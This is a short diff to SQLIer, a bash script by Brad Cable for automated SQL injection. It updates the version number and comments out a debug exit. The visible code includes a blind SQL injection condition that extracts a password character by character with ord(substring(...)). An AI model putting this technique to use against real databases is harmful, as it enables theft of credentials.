@@ -1,7 +1,7 @@
 #!/bin/bash
 
 #
-# SQLIer - Version 0.1a
+# SQLIer - Version 0.1.1a
 #
 # Author: Brad Cable
 # Email: brad@bcable.net
@@ -27,8 +27,8 @@ done
 userstr="${userstr:0:${#userstr}-1})"
 
 url="`echo "$url" | sed -r "s/XXusernameXX/$userstr/g"`"
-echo $url
-exit
+#echo $url
+#exit
 
 function inject(){
 	passstr="ord(substring($password,$1,1))>$2"
